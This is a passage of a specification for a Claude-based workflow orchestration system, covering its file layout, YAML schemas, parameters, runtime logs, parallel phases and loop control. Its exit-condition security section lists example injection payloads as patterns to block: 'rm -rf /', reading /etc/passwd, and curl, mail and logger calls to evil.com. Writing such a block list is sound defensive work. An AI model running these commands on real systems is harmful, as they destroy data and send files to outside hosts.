# Workflow System Specification v1.0

This document is the authoritative specification for the Claude Workflow Orchestration System. All components (commands, agents, workflows) must conform to these specifications.

## Table of Contents
1. [System Architecture](#system-architecture)
2. [File Structure Requirements](#file-structure-requirements)
3. [Workflow Configuration Schema](#workflow-configuration-schema)
4. [Phase Metadata Schema](#phase-metadata-schema)
5. [Parameter Specifications](#parameter-specifications)
6. [Runtime File Specifications](#runtime-file-specifications)
7. [Execution Modes](#execution-modes)
8. [Validation Rules](#validation-rules)
9. [Agent Constraints](#agent-constraints)
10. [Validation Severity Levels](#validation-severity-levels)
11. [Schema Validation](#schema-validation)
12. [Future Features](#future-features-not-implemented)

## System Architecture

### Terminology

- **Workflow directory**: The folder containing all files for a single workflow (e.g., `.claude/workflows/my-workflow/`)
- **`WORKFLOW_DIR`**: Parameter/variable name referring to the workflow directory path
- **Phase file**: A markdown file defining one phase (e.g., `phase-01-setup.md`)

### Core Components
- **Workflow Orchestrator**: Main execution engine (`run-workflow` command)
- **Workflow Creator**: Generates workflows from requirements (`create-workflow` command)
- **Phase Executor**: Isolated agent executing individual phases
- **Workflow Validator**: Validates workflow structure and metadata (`validate-workflow` command)

### Execution Flow
```
User → Command → Orchestrator → Phase Loop → Agent Execution → Output Collection
```

### Critical Architectural Constraints
1. **No Nested Agent Execution**: Agents CANNOT invoke other agents
2. **Phase Isolation**: Each phase executes in isolated context
3. **Explicit Dependencies**: All inputs/outputs must be declared
4. **Parameter Flow**: Parameters flow forward through phases

## File Structure Requirements

### Directory Layout
```
.claude/workflows/<workflow-name>/
├── workflow.yaml           # REQUIRED: Workflow configuration
├── README.md              # RECOMMENDED: Human documentation
├── phase-00-*.md          # OPTIONAL: Setup/discovery phase
├── phase-01-*.md          # REQUIRED: First execution phase
├── phase-02-*.md          # REQUIRED: At least one more phase
├── phase-NN-*.md          # OPTIONAL: Additional phases
├── examples/              # OPTIONAL: Example configurations
│   └── parameters.yaml    # Example parameter sets
└── runs/                  # GENERATED: Execution history
    └── wf-YYYYMMDD-HHMMSS-*/  # Per-run metadata
        ├── runtime-parameters.yaml
        ├── execution.log
        └── loop_state.yaml (if loops exist)
```

### File Naming Conventions

#### Phase Files
- **Pattern**: `phase-XX-<descriptive-name>.md`
- **Rules**:
  - Must start with `phase-`
  - Followed by two-digit number (00-99)
  - Hyphen separator
  - Descriptive lowercase name (kebab-case)
  - Must end with `.md`
- **Examples**:
  - ✅ `phase-00-setup.md`
  - ✅ `phase-01-feature-extraction.md`
  - ❌ `phase-1-test.md` (single digit)
  - ❌ `Phase-01-Test.md` (uppercase)

#### Phase Numbering
- **Sequential**: No gaps allowed in numbering sequence
- **Starting Options**:
  - Start with `01` for workflows without setup phase
  - Start with `00` for workflows that need setup/discovery
- **Phase 00**: Reserved for setup, discovery, or parameter initialization
  - If present, must be followed by `01`, `02`, etc.
  - Optional - not all workflows need a phase 00
- **Minimum Phases**: At least two phase files required
  - Valid configurations: `phase-01` + `phase-02` OR `phase-00` + `phase-01`
  - Any sequential combination of 2+ phases with no gaps is valid
- **Valid Examples**:
  - `phase-01-*.md`, `phase-02-*.md` (two phases, no setup)
  - `phase-00-*.md`, `phase-01-*.md` (two phases with setup)
  - `phase-00-*.md`, `phase-01-*.md`, `phase-02-*.md` (three phases with setup)
  - `phase-01-*.md`, `phase-02-*.md`, `phase-03-*.md` (three phases, no setup)
- **Invalid Examples**:
  - `phase-01-*.md` only (only one phase - needs at least two)
  - `phase-00-*.md` only (only one phase - needs at least two)
  - `phase-00-*.md`, `phase-02-*.md` (gap - missing 01)
  - `phase-01-*.md`, `phase-03-*.md` (gap - missing 02)

## Workflow Configuration Schema

### workflow.yaml Structure

```yaml
# REQUIRED FIELDS
name: string                    # Workflow identifier (kebab-case)
description: string             # Human-readable description
version: string                 # Semantic version (X.Y.Z)

# OPTIONAL SECTIONS
parameters:                     # Parameter definitions
  <parameter_name>:            # Or array format (see below)
    type: string               # string|boolean|integer|number|enum|file|directory|array
    required: boolean          # Is parameter required?
    description: string        # Human-readable description
    default: any              # Default value (type must match)
    enum: array               # Valid values (if type=enum)
    example: any              # Example value

phases:                        # Phase execution configuration
  require_confirmation: boolean  # Confirm before each phase (default: false)
  allow_retry: boolean          # Allow phase retry on failure (default: true)
  generate_logs: boolean        # Create execution.log (default: true)
  stop_on_failure: boolean      # Halt on phase failure (default: true)
  parallel_execution_supported: boolean  # Workflow supports parallel phases (default: false)

metadata:                      # Workflow metadata
  generated_from: array        # Source files used for generation
  generated_date: string       # ISO date of generation
  workflow_type: string        # deployment|testing|migration|build|data-processing|requirements-processing|technical-planning|setup|automation
  complexity: string           # simple|medium|complex
  supported_agents: array      # List of specialized agents used
  architecture_notes: array    # Important architectural constraints
```

### Field Constraints

| Field | Min Length | Max Length | Format |
|-------|------------|------------|--------|
| `name` | 3 | 50 | kebab-case (`^[a-z][a-z0-9-]*$`) |
| `description` | 10 | 500 | Any text |
| `version` | - | - | Semantic version (`X.Y.Z`) |
| Parameter `description` | 5 | 200 | Any text |
| Phase file `description` | 5 | 200 | Any text |

### Parameter Array Format
Parameters can also be defined as an array:
```yaml
parameters:
  - name: ENVIRONMENT
    type: string
    required: true
    description: "Target environment"
    enum: ["dev", "staging", "prod"]
```

### Phases Configuration Details

#### `parallel_execution_supported`

This boolean flag indicates whether the workflow contains phases that use parallel execution mode. It serves as:

1. **Documentation**: Signals to users that this workflow leverages parallel agent execution
2. **Validation hint**: Validators can check that `execution_mode: parallel` appears in at least one phase when this is `true`
3. **Future use**: May be used by orchestrators to pre-allocate resources for parallel execution

**Note**: This flag is informational. The actual parallel execution is controlled by individual phase metadata (`execution_mode: parallel`), not this workflow-level flag. Setting this to `true` when no phases use parallel mode is a validation warning, not an error.

#### `default_model`

Optional field specifying the default Claude model for phase execution:

```yaml
phases:
  default_model: sonnet  # Optional: opus, sonnet, or haiku
```

**Default**: `sonnet` if not specified
**Override**: Individual phases can override using `phase_metadata.model`

**Resolution Priority**:
1. Phase-level `model` field (highest)
2. Workflow-level `default_model`
3. System default ("sonnet")

**Model Guide**:
- `opus`: Complex reasoning, sophisticated analysis, best quality
- `sonnet`: Balanced performance and cost (recommended default)
- `haiku`: Fast operations, simple tasks, cost-effective

## Phase Metadata Schema

### Recommended Structure
Every phase file SHOULD begin with a YAML frontmatter section (WARNING issued if missing, but phases will still execute with implicit parameter passing):

```yaml
---
phase_metadata:
  # Optional: Execution mode configuration
  execution_mode: string       # sequential (default) | parallel
  
  # Required for parallel execution
  parallel_config:
    agent_type: string         # Specialized agent to use
    discovery_pattern: string  # Glob pattern to find work items
    work_item_parameter: string # Parameter name for work item
    output_pattern: string     # Output path pattern with {placeholders}
    max_parallel: number|string # Max concurrent agents (0=unlimited, can be parameter reference)
  
  # Input specifications
  inputs:
    files:                     # Input file specifications
      - name: string          # Parameter name for file
        required: boolean     # Is this file required?
        path: string          # Optional: explicit path (can use parameters)
        description: string   # What this file contains

    parameters:               # Input parameter specifications
      - name: string         # Parameter name
        required: boolean    # Is this parameter required?
        default: any         # Optional: default value
        description: string  # Parameter purpose
        type: string         # Optional: expected type (string|boolean|integer|number|enum|file|directory|array)
  
  # Output specifications
  outputs:
    files:                   # Output file specifications
      - path: string        # Path where file will be created (can use parameters)
        description: string # What this file contains
        required: boolean   # Whether output must be created (default: true)
    
    parameters:             # Output parameter specifications
      - name: string       # Parameter name for next phases
        description: string # What this parameter represents
        required: boolean   # Whether this output is guaranteed (default: true)
        type: string       # Parameter type (string|boolean|integer|number|enum|file|directory|array)
  
  # Optional: Agent preferences
  preferred_agent: string   # Hint for orchestrator agent selection

  # Optional: Model selection
  model: string            # Claude model to use for this phase (opus|sonnet|haiku)
---
```

### Model Selection

Phases can override the workflow's default model:

```yaml
phase_metadata:
  model: opus  # Optional: opus, sonnet, or haiku
```

See [`default_model`](#default_model) above for resolution priority and model descriptions.

**Example** - Mixed model workflow:
```yaml
# Phase 01: Complex analysis uses Opus
phase_metadata:
  model: opus
  inputs:
    files:
      - name: REQUIREMENTS_DOC

# Phase 02: Simple extraction uses Haiku
phase_metadata:
  model: haiku
  inputs:
    files:
      - name: SOURCE_FILE
```

### Parameter Interpolation

Parameters can be interpolated in paths and configuration values using two equivalent syntaxes:

**Syntax Options**:
- `$PARAMETER_NAME` - Simple form, works in most cases
- `${PARAMETER_NAME}` - Explicit form, required when parameter is adjacent to other characters

**When to Use Each**:
```yaml
# Simple form (preferred when unambiguous)
path: "$OUTPUT_DIR/report.md"

# Explicit form (required when adjacent to other text)
path: "${OUTPUT_DIR}_backup/report.md"
filename: "${PREFIX}report.md"
```

**Resolution Sources** (in priority order):
1. Command-line arguments
2. Environment variables with `WORKFLOW_` prefix (e.g., `WORKFLOW_OUTPUT_DIR` for parameter `OUTPUT_DIR`)
3. Previous phase outputs (from runtime-parameters.yaml)
4. Default values in workflow.yaml
5. Default values in phase metadata

**Environment Variable Convention**: To pass a parameter via environment variable, prefix the parameter name with `WORKFLOW_`. For example:
- Parameter `OUTPUT_DIR` → Environment variable `WORKFLOW_OUTPUT_DIR`
- Parameter `MAX_RETRIES` → Environment variable `WORKFLOW_MAX_RETRIES`

**Example**:
```yaml
path: "$OUTPUT_DIR/$SPECS_DIR/report.md"
# With OUTPUT_DIR=./outputs and SPECS_DIR=specs
# Resolves to: ./outputs/specs/report.md
```

**Note**: Both syntaxes are functionally equivalent. Use `${}` form when the parameter name would otherwise be ambiguous in context.

## Parameter Specifications

### Parameter Types

| Type | Description | Example | Validation |
|------|-------------|---------|------------|
| `string` | Text value | `"production"` | Any string |
| `boolean` | True/false | `true` | true/false only |
| `integer` | Whole number | `42` | Integer only |
| `number` | Decimal number | `3.14` | Any numeric value |
| `enum` | Restricted choice | `"prod"` | Must match enum list |
| `file` | File path | `"./config.yaml"` | File should exist |
| `directory` | Directory path | `"./outputs"` | Directory should exist |
| `array` | List of values | `["a", "b", "c"]` | Valid JSON/YAML array |

### Parameter Naming Conventions
- **Format**: UPPER_SNAKE_CASE for consistency
- **Examples**: `OUTPUT_DIR`, `MAX_RETRIES`, `ENABLE_LOGGING`
- **Reserved**: Avoid `PHASE_`, `WORKFLOW_`, `SYSTEM_` prefixes

### Advanced Parameter Validation

Parameters support additional validation constraints beyond basic types:

| Property | Applies To | Description | Example |
|----------|------------|-------------|---------|
| `min` | integer, number | Minimum allowed value | `min: 1` |
| `max` | integer, number | Maximum allowed value | `max: 100` |
| `pattern` | string | Regex pattern for validation | `pattern: "^[a-z-]+$"` |

**Example with validation constraints**:
```yaml
parameters:
  MAX_RETRIES:
    type: integer
    required: false
    default: 3
    min: 1
    max: 10
    description: "Number of retry attempts (1-10)"

  WORKFLOW_ID:
    type: string
    required: true
    pattern: "^wf-[a-z0-9-]+$"
    description: "Workflow identifier (must start with 'wf-')"
```

## Runtime File Specifications {#runtime-file-specifications}

### Template vs Runtime Parameter Interpolation

When creating phase files (either manually or via workflow-creator), understand the distinction between two types of placeholders:

| Placeholder Type | Syntax | Resolved When | Example |
|-----------------|--------|---------------|---------|
| **Template placeholders** | `${VARIABLE}` | During workflow generation | `${PHASE_NUMBER}`, `${PHASE_NAME}` |
| **Runtime parameters** | `$PARAM` or `${PARAM}` | During workflow execution | `$OUTPUT_DIR`, `${SPECS_DIR}` |

**Template placeholders** (used in `.claude/templates/phase-template.md`):
- Replaced by workflow-creator agent when generating phase files
- Use descriptive names like `${PHASE_PURPOSE}`, `${TASKS_LIST}`
- Result in static content in the generated phase file

**Runtime parameters** (used in generated phase files):
- Remain as `$PARAM` references in generated files
- Resolved by the orchestrator during workflow execution
- Follow UPPER_SNAKE_CASE naming convention

**Example transformation**:
```yaml
# In template (phase-template.md):
- name: ${INPUT_FILE_PARAM}           # Template placeholder
  path: "${INPUT_FILE_PATH}"          # Becomes runtime param reference

# After generation (phase-01-extract.md):
- name: SOURCE_DATA                   # Static value from template
  path: "$OUTPUT_DIR/source.json"     # Runtime parameter reference
```

### Phase Completion Protocol

When a phase completes, the executing agent MUST output a structured completion report.

**Format**: YAML block with `phase_completion` root key

**Required Fields**:
- `status`: `SUCCESS` | `FAILURE`
- `outputs_created`: Array of `{path, exists}` objects
- `parameters_discovered`: Object of parameter key-value pairs
- `success_criteria`: Array of `{criterion, met}` objects
- `errors`: Array of error strings (empty if success)

**Optional Fields**:
- `notes`: Array of observation strings - useful observations, warnings, or suggestions for subsequent phases
- `duration_seconds`: Approximate execution time in seconds - used for logging and performance analysis

**Field Details**:

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `status` | string | Yes | `SUCCESS` or `FAILURE` |
| `outputs_created` | array | Yes | List of `{path, exists}` objects |
| `parameters_discovered` | object | Yes | Key-value pairs (empty `{}` if none) |
| `success_criteria` | array | Yes | List of `{criterion, met}` objects |
| `errors` | array | Yes | Error messages (empty `[]` if success) |
| `notes` | array | No | Observations or warnings |
| `duration_seconds` | integer | No | Execution time for logging |

The orchestrator uses this report to:
1. Validate phase completion
2. Update `runtime-parameters.yaml`
3. Append to `execution.log`
4. Determine whether to proceed or abort

### Run Directory Structure

All workflow execution metadata is organized in timestamped directories to preserve execution history.

**Location**: `<workflow-directory>/runs/`

**Structure**:
```
<workflow-directory>/runs/
├── wf-20250114-093000-xyz789/    # Older run
│   ├── runtime-parameters.yaml
│   ├── execution.log
│   └── loop_state.yaml (if loops were used)
└── wf-20250114-100000-abc123/    # Recent run
    ├── runtime-parameters.yaml
    ├── execution.log
    └── loop_state.yaml
```

**Naming Convention**:
- Format: `wf-YYYYMMDD-HHMMSS-<random>`
- Components:
  - `wf-` prefix (workflow)
  - `YYYYMMDD` date in UTC
  - `HHMMSS` time in UTC
  - 6 random alphanumeric characters (collision prevention)
- Example: `wf-20250114-143022-a3f9c2`

**Creation**:
- Directory created at workflow start by orchestrator
- Unique per execution run
- All runtime files scoped to this directory

**Lifecycle**:
- Created: At workflow initialization (before first phase)
- Updated: Throughout workflow execution
- Preserved: After workflow completion
- Cleanup: Manual (no automatic cleanup)

**Backward Compatibility**:
- Legacy runtime files in workflow root are ignored
- New runs always use `runs/<workflow_run_id>/` structure

### runtime-parameters.yaml

This file is automatically generated and maintained by the workflow orchestrator during execution.

**Location**: `<workflow-directory>/runs/<workflow_run_id>/runtime-parameters.yaml`

**Structure**:
```yaml
generated_at: "2025-01-12T14:30:00Z"  # ISO 8601 timestamp
workflow_run_id: "wf-20250112-143000-abc123"  # Unique run identifier

# Initial parameters from workflow.yaml and CLI
initial:
  OUTPUT_DIR: "./outputs"
  ENVIRONMENT: "production"
  BACKUP: true

# Parameters discovered during phase execution
discovered:
  SPECS_COUNT: 12
  VALIDATION_PASSED: true
  DATABASE_TYPE: "postgresql"

# Current merged state of all parameters
current:
  OUTPUT_DIR: "./outputs"
  ENVIRONMENT: "production"
  BACKUP: true
  SPECS_COUNT: 12
  VALIDATION_PASSED: true
  DATABASE_TYPE: "postgresql"
```

**Update Rules**:
1. Created at workflow start with `initial` and `current` sections
2. After each phase completion, orchestrator merges discovered parameters into `discovered` and `current`
3. `initial` section remains unchanged throughout execution
4. `current` section always reflects the latest merged state
5. Used for parameter resolution in subsequent phases

### execution.log

This file contains a structured log of workflow execution events.

**Location**: `<workflow-directory>/runs/<workflow_run_id>/execution.log`

**Format**:
```
[TIMESTAMP] EVENT_TYPE: Event details

EVENT_TYPES:
- PHASE_START: Phase N beginning execution
- PARAMETERS_RESOLVED: Parameters for phase N resolved
- AGENT_LAUNCHED: Agent started for phase N
- AGENT_COMPLETED: Agent finished for phase N
- OUTPUTS_CREATED: Phase N created output files
- PARAMETERS_DISCOVERED: Phase N discovered new parameters
- PHASE_COMPLETE: Phase N completed successfully
- PHASE_FAILED: Phase N failed with error
- PHASE_RETRY: Phase N being retried (attempt number, reason)
- WORKFLOW_COMPLETE: All phases completed successfully
- WORKFLOW_ABORTED: Workflow terminated due to error
```

**Example Log Entries**:
```
[2025-01-12 14:30:00] PHASE_START: Starting phase-01-extraction.md
[2025-01-12 14:30:01] PARAMETERS_RESOLVED: OUTPUT_DIR=./outputs, FEATURES_DIR=./features
[2025-01-12 14:30:02] AGENT_LAUNCHED: phase-executor for phase-01-extraction.md
[2025-01-12 14:31:45] AGENT_COMPLETED: phase-executor completed successfully
[2025-01-12 14:31:46] OUTPUTS_CREATED: Created 3 files: feature-list.json, summary.md, metadata.yaml
[2025-01-12 14:31:46] PARAMETERS_DISCOVERED: FEATURE_COUNT=25, TOTAL_TASKS=127
[2025-01-12 14:31:47] PHASE_COMPLETE: phase-01-extraction.md completed in 1m47s
[2025-01-12 14:31:47] PHASE_START: Starting phase-02-specification.md
```

**Log Event Details**:

| Event Type | Description | Included Information |
|------------|-------------|----------------------|
| `PHASE_START` | Phase execution begins | Phase file name |
| `PARAMETERS_RESOLVED` | Parameters prepared for phase | Resolved parameter values |
| `AGENT_LAUNCHED` | Agent started | Agent type, phase file |
| `AGENT_COMPLETED` | Agent finished | Success/failure status |
| `OUTPUTS_CREATED` | Phase outputs generated | File paths created |
| `PARAMETERS_DISCOVERED` | New parameters found | Parameter names and values |
| `PHASE_COMPLETE` | Phase finished successfully | Duration, outputs summary |
| `PHASE_FAILED` | Phase encountered error | Error message, failure reason |
| `PHASE_RETRY` | Phase being retried | Attempt number, reason |
| `WORKFLOW_COMPLETE` | All phases succeeded | Total duration, summary |
| `WORKFLOW_ABORTED` | Workflow stopped early | Reason, last completed phase |

### loop_state.yaml

This file is automatically generated and maintained by the workflow orchestrator when workflows contain loops.

**Location**: `<workflow-directory>/runs/<workflow_run_id>/loop_state.yaml`

**Created When**: Workflow contains a `loops` section in workflow.yaml

**Structure**:
```yaml
loops:
  refinement-loop:
    name: refinement-loop
    current_iteration: 3
    total_iterations: 3
    max_iterations: 20
    phases: [2, 3, 4]

    # Optional: Exit condition if specified in workflow.yaml
    exit_condition:
      expression: "$CONVERGENCE_DELTA < $CONVERGENCE_THRESHOLD"
      description: "Exit when convergence achieved"
      validated: true
      parameters_used: ["CONVERGENCE_DELTA", "CONVERGENCE_THRESHOLD"]

    iteration_history:
      - iteration: 1
        timestamp: "2025-01-15T10:30:00Z"
        duration_seconds: 45
        # Exit condition evaluation (if applicable)
        exit_condition_checked: true
        exit_condition_result: false
        exit_condition_resolved: "0.15 < 0.01"

      - iteration: 2
        timestamp: "2025-01-15T10:35:00Z"
        duration_seconds: 52
        exit_condition_checked: true
        exit_condition_result: false
        exit_condition_resolved: "0.08 < 0.01"

      - iteration: 3
        timestamp: "2025-01-15T10:40:00Z"
        duration_seconds: 48
        exit_condition_checked: true
        exit_condition_result: true
        exit_condition_resolved: "0.008 < 0.01"

    # Added when loop completes
    completed: true
    exit_reason: "exit_condition_met"  # or: "max_iterations", "phase_override", "fixed_iterations_complete"
    exit_condition_expression: "$CONVERGENCE_DELTA < $CONVERGENCE_THRESHOLD"
    exit_condition_resolved: "0.008 < 0.01"
```

**Update Rules**:
1. Created at workflow start when `loops` section exists in workflow.yaml
2. After each loop iteration, orchestrator updates iteration history
3. When loop exits, `completed` flag and `exit_reason` are added
4. File persists for monitoring and debugging loop execution

**Field Descriptions**:

| Field | Type | Description |
|-------|------|-------------|
| `current_iteration` | integer | Current iteration number (1-based) |
| `total_iterations` | integer | Total completed iterations |
| `max_iterations` | integer | Safety limit from workflow.yaml |
| `phases` | array | Phase numbers in loop body |
| `exit_condition` | object | Exit condition configuration (if applicable) |
| `iteration_history` | array | Record of each iteration with timing and results |
| `completed` | boolean | Whether loop has finished |
| `exit_reason` | string | Why loop exited (exit_condition_met, max_iterations, phase_override, fixed_iterations_complete) |

## Execution Modes

### Sequential Execution (Default)
```yaml
phase_metadata:
  execution_mode: sequential  # Or omit for default
```
- Single agent executes phase
- Processes all work in sequence
- Standard phase-executor agent

### Parallel Execution
```yaml
phase_metadata:
  execution_mode: parallel
  parallel_config:
    agent_type: feature-specifier
    discovery_pattern: "$OUTPUT_DIR/features/FEAT-*.md"
    work_item_parameter: FEATURE_FILE
    output_pattern: "$OUTPUT_DIR/specs/SPEC-{number}-{name}/spec.md"
    max_parallel: 5
```
- Multiple agents execute concurrently
- One agent per discovered work item
- Orchestrator manages parallelization
- Results aggregated after completion

### Parallel Configuration Fields

| Field | Required | Description |
|-------|----------|-------------|
| `agent_type` | Yes | Specialized agent for the task |
| `discovery_pattern` | Yes | Glob pattern to find work items |
| `work_item_parameter` | Yes | Parameter name passed to each agent |
| `output_pattern` | No | Expected output path pattern |
| `max_parallel` | No | Maximum concurrent agents (0=unlimited) |

### Important: Orchestrator-Managed Parallelization

**Critical Clarification**: The `agent_type` in `parallel_config` specifies which agent the **workflow orchestrator** will launch for each work item. The phase itself does NOT invoke agents—the orchestrator does this. This maintains the "no nested agent execution" constraint while enabling parallelism.

**How It Works**:
- **Phase files** define WHAT work should be parallelized (via `parallel_config`)
- **The orchestrator** decides HOW to parallelize (by launching multiple agents)
- **Individual agents** still cannot invoke other agents (constraint preserved)

This design ensures that parallel execution is orchestrated at the system level, not within individual agent contexts, maintaining predictable execution and debuggability.

### Parallel Error Handling and Result Aggregation

When executing phases in parallel mode, the orchestrator must handle partial failures and aggregate results from multiple agents.

#### Error Handling Strategy

**Default Behavior** (All-or-Nothing):
- All parallel agents must complete successfully for the phase to succeed
- If ANY agent fails, the entire parallel phase is marked as FAILED
- Failed work items are identified in the error report
- Phase can be retried if `allow_retry: true` in workflow.yaml

**Partial Success Handling**:
```yaml
# In phase completion report from orchestrator
phase_completion:
  status: FAILURE
  errors:
    - "3 of 10 work items failed processing"
    - "Failed items: FEAT-003.md, FEAT-007.md, FEAT-009.md"
  notes:
    - "7 items processed successfully"
    - "Outputs created for successful items available at $OUTPUT_DIR/specs/"
```

#### Result Aggregation Rules

**File Outputs**:
1. Orchestrator collects all output files from successful agents
2. Failed agents' partial outputs are NOT included in aggregation
3. Output count is verified against expected count (total work items)
4. If count mismatch, phase status is FAILURE with specific error

**Parameter Discovery**:
1. Parameters discovered by each agent are merged into a unified set
2. Numeric parameters are aggregated using specified strategy:
   - **Count aggregation** (default): `SPECS_COUNT = total_successful_agents`
   - **Sum aggregation**: `TOTAL_SIZE = sum(SIZE_1, SIZE_2, ..., SIZE_N)`
   - **List aggregation**: `GENERATED_FILES = [file_1, file_2, ..., file_N]`
3. Conflicting parameter values trigger WARNING with last-write-wins behavior
4. Aggregated parameters are written to runtime-parameters.yaml

**Aggregation Example**:
```yaml
# Agent 1 completion report
parameters_discovered:
  FEATURE_COUNT: 1
  VALIDATION_PASSED: true

# Agent 2 completion report
parameters_discovered:
  FEATURE_COUNT: 1
  VALIDATION_PASSED: true

# Agent 3 completion report (failed)
# Not included in aggregation

# Orchestrator aggregated result (2 successful, 1 failed)
parameters_discovered:
  FEATURE_COUNT: 2          # Sum of successful agents
  VALIDATION_PASSED: true   # Consistent across agents
  FAILED_COUNT: 1           # Orchestrator adds failure tracking
  TOTAL_ITEMS: 3            # Total work items discovered
```

#### Retry Behavior for Parallel Phases

When `allow_retry: true`:
1. **Full Retry**: All work items re-executed (including previously successful)
2. **Selective Retry**: Only failed work items re-executed (orchestrator tracks state)
3. Default is **Full Retry** for simplicity and idempotency

**Selective Retry** (future enhancement):
- Orchestrator maintains state file tracking successful items
- Only failed items included in retry discovery pattern
- Useful for expensive, idempotent operations

#### Progress Reporting

During parallel execution, orchestrator provides:
```
[PARALLEL PHASE] Launching 10 agents for phase-02-transform.md
[AGENT PROGRESS] 3/10 completed (30%)
[AGENT PROGRESS] 7/10 completed (70%)
[AGENT PROGRESS] 9/10 completed (90%)
[AGENT FAILURE] Agent for FEAT-007.md failed: Schema validation error
[PARALLEL PHASE] Completed: 9 successful, 1 failed
[PHASE FAILURE] Phase-02 failed due to agent failures
```

## Loop Execution

### Overview

Workflows support iterative execution through a **hybrid loop configuration** that combines:
- **Declarative structure** in workflow.yaml (explicit, validated, documented)
- **Phase-level control** via parameters (dynamic, flexible override)

This provides both static analyzability and dynamic control for convergence testing and quality gates.

### Basic Loop Configuration (MVP)

```yaml
loops:
  - name: quality-improvement
    description: "Refine until quality standards met"
    phases: [2, 3]              # Phases 2-3 form loop body
    max_iterations: 10          # Safety limit (required)
    iterations: 5               # Fixed: run exactly 5 times
    allow_phase_control: true   # Phases can override via LOOP_CONTINUE
```

### Loop Configuration Fields

| Field | Required | Type | Description |
|-------|----------|------|-------------|
| `name` | Yes | string | Loop identifier in kebab-case (3-50 chars) |
| `description` | No | string | Human-readable purpose of this loop |
| `phases` | Yes | array[int] | Phase numbers forming loop body (e.g., [2, 3, 4]) |
| `max_iterations` | Yes | integer | Safety limit, maximum iterations allowed (1-100) |
| `iterations` | No | integer | Fixed iteration count (run exactly N times) |
| `allow_phase_control` | No | boolean | Allow phases to override via LOOP_CONTINUE (default: true) |

### Loop Control Priority

When evaluating whether to continue a loop after completing the last phase:

1. **max_iterations** (HIGHEST): Safety limit, cannot exceed - workflow aborts if exceeded
2. **LOOP_CONTINUE parameter** (phase override): If `allow_phase_control: true` and phase sets this parameter
3. **exit_condition** (declarative exit): Optional expression evaluated by orchestrator after each iteration
4. **iterations** (fixed count): Default behavior - loop exactly N times if no override
5. **Default**: Exit loop if no control mechanism specified

### Loops Without Explicit Control Mechanism

A loop configuration may omit both `iterations` and `exit_condition` fields. This is **valid** when `allow_phase_control: true` (the default), allowing phases to have full control via `LOOP_CONTINUE` parameter.

**Valid Configuration**:
```yaml
loops:
  - name: adaptive-refinement
    phases: [2, 3, 4]
    max_iterations: 20
    allow_phase_control: true  # Phases control loop via LOOP_CONTINUE
    # No iterations or exit_condition - phase-driven control
```

**Behavior**:
- Loop exits after first iteration unless phase sets `LOOP_CONTINUE: true`
- Useful for adaptive workflows where exit criteria are too complex for declarative expressions
- Phases must implement loop control logic and set `LOOP_CONTINUE` parameter

**Invalid Configuration**:
```yaml
loops:
  - name: broken-loop
    phases: [2, 3]
    max_iterations: 10
    allow_phase_control: false  # ERROR: No control mechanism available
    # No iterations or exit_condition AND phase control disabled
```

**Validation Rules**:
- **ERROR**: If `allow_phase_control: false` AND no `iterations` AND no `exit_condition`
- **INFO**: If `allow_phase_control: true` AND no `iterations` AND no `exit_condition` → Suggest documenting phase control logic

### Phase Override Protocol

Phases can control loop continuation by discovering special parameters:

```yaml
# In phase completion report
phase_completion:
  status: SUCCESS
  parameters_discovered:
    CONVERGENCE_DELTA: 0.008

    # Phase override parameters
    LOOP_CONTINUE: true         # or false
    LOOP_REASON: "Quality improving, continue refinement"
```

**Override Behavior**:
- `LOOP_CONTINUE: false` → Exit loop immediately (even if `iterations` remain)
- `LOOP_CONTINUE: true` → Continue loop (subject to `max_iterations` limit)
- Not specified → Use default behavior (fixed `iterations` or exit)

**Best Practices**:
- Always include `LOOP_REASON` to document decision rationale
- Use boolean logic in bash: `LOOP_CONTINUE=$([ $DELTA -lt $THRESHOLD ] && echo "false" || echo "true")`
- Log decision criteria for debugging

### Exit Condition Protocol

Workflows can optionally specify declarative exit conditions that are evaluated by the orchestrator:

**Configuration**:
```yaml
loops:
  - name: convergence-loop
    phases: [2, 3, 4]
    max_iterations: 20
    exit_condition:
      expression: "$CONVERGENCE_DELTA < $CONVERGENCE_THRESHOLD"
      description: "Exit when convergence achieved"
```

**Expression Syntax**:

Supported operators:
- **Numeric comparisons**: `<`, `>`, `<=`, `>=`, `==`, `!=`
- **Boolean operators**: `&&` (AND), `||` (OR), `!` (NOT)
- **Grouping**: `(`, `)` for precedence

Parameter references:
- Use `$PARAM` or `${PARAM}` syntax
- Parameters must be declared in `workflow.yaml`
- Parameters must be available in `runtime-parameters.yaml` at evaluation time

Literals:
- Numbers: `42`, `3.14`, `-5.2`
- Strings: `'value'` or `"value"` (quoted)
- Booleans: `true`, `false`

**Security Constraints**:

Exit condition expressions are evaluated in a controlled environment to prevent injection attacks. The following characters and patterns are **forbidden**:

| Forbidden Pattern | Reason | Example Attack |
|-------------------|--------|----------------|
| `;` (semicolon) | Command chaining | `$DELTA < 0.1; rm -rf /` |
| `\|` (pipe) | Command piping | `$STATUS == 'done' \| mail attacker@evil.com` |
| `&` (ampersand, except in `&&`) | Background execution | `$VALUE > 0 & malicious-script` |
| `` ` `` (backtick) | Command substitution | ``$COUNT == `cat /etc/passwd \| wc -l` `` |
| `$(...)` (except `$PARAM`) | Command substitution | `$THRESHOLD == $(curl evil.com/cmd)` |
| `<(...)` | Process substitution | `$DATA < <(malicious-generator)` |
| `>(...)` | Process substitution | `$RESULT > >(logger --server evil.com)` |
| `<`, `>`, `<<`, `>>` (except comparison) | File redirection | `$VALUE > 0 > /tmp/exfiltrate` |
| `eval`, `exec`, `source` | Code execution | `eval $MALICIOUS_CODE` |

**Validation Process**:
1. **Pattern Scanning**: Expression is scanned for forbidden patterns before workflow execution
2. **Parameter Isolation**: Only declared parameters from `workflow.yaml` are allowed
3. **Operator Whitelisting**: Only explicitly allowed operators (`<`, `>`, `<=`, `>=`, `==`, `!=`, `&&`, `||`, `!`) are permitted
4. **Safe Evaluation**: Expressions are translated to isolated bash/bc evaluation with no variable expansion
5. **Sandboxed Execution**: Evaluation occurs in restricted context with no network or file system access

**Validation Examples**:
```yaml
# VALID - Safe numeric comparison
exit_condition:
  expression: "$CONVERGENCE_DELTA < $CONVERGENCE_THRESHOLD"

# INVALID - Command substitution attempt
exit_condition:
  expression: "$COUNT == $(wc -l < file.txt)"
  # ERROR: Command substitution $(... detected

# INVALID - Command chaining attempt
exit_condition:
  expression: "$STATUS == 'done'; curl evil.com"
  # ERROR: Forbidden character ';' detected

# INVALID - Undeclared parameter
exit_condition:
  expression: "$UNDECLARED_VAR < 10"
  # ERROR: Parameter UNDECLARED_VAR not found in workflow.yaml
```

**Expression Examples**:
```yaml
# Numeric convergence
exit_condition:
